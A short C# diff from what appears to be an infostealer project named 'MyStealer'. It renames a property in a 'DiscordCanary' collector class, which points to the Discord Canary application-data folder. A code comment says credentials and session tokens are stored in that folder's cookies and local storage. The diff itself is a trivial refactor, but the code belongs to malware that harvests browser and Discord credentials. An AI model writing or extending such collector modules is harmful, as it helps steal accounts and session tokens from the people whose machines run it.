@@ -7,7 +7,7 @@ namespace MyStealer.Collector.Browser.ChromiumBased
     // but it uses CEF as backend, and all credentials and session tokens are stored in cookies & local storage
     public class DiscordCanary : Discord
     {
-        public override string ModuleName => "Discord Canary";
+        public override string Name => "Discord Canary";
 
         protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordcanary");
     }
